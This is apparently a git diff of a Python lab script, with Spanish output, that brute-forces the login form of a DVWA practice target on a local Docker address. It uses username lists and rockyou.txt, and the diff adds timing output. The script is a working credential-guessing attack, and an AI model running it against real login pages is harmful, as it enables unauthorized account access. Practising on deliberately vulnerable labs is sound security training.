@@ -1,10 +1,11 @@
 import requests
 import sys
+import time
 
 url = "http://172.17.0.1:5000/vulnerabilities/brute/"
 
 headers = {
-    "Cookie": "security=low; PHPSESSID=g1umh8bc44mlgrntlk9pb45kd1",  
+    "Cookie": "security=low; PHPSESSID=pd48ru6t0diq7roc8kuaeh9qb0",  
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
@@ -16,6 +17,8 @@ headers = {
 def brute_force_attack(username_file, password_file):
     count_fails = 0     
     credentials = []
+
+    start_time = time.time()
 
     with open(username_file, 'r') as users:
         user_list = [user.strip() for user in users]
@@ -45,16 +48,24 @@ def brute_force_attack(username_file, password_file):
                 credentials.append({"user": user, "password": password})
                 
                 if len(credentials) == 5:
+                    end_time = time.time()
+
                     print("\nCredenciales encontradas:")
                     for i, cred in enumerate(credentials):
                         print(f"{i+1}.\033[96m Usuario:\033[93m {cred['user']}, \033[96mContraseña: \033[93m{cred['password']}\033[0m")
                     print("\nTotal de fallos: ", count_fails)
+                    
+                    total_time = end_time - start_time
+                    print(f"\nTiempo total: {total_time:.2f} segundos")
                     return
                 else:
                     break    
             else:
                 continue
 
+    end_time = time.time()
+    total_time = end_time - start_time
+    print(f"\nTiempo total: {total_time:.2f} segundos")
 
 username_file = "../utils/users.txt"
 password_file = "../utils/rockyou.txt"
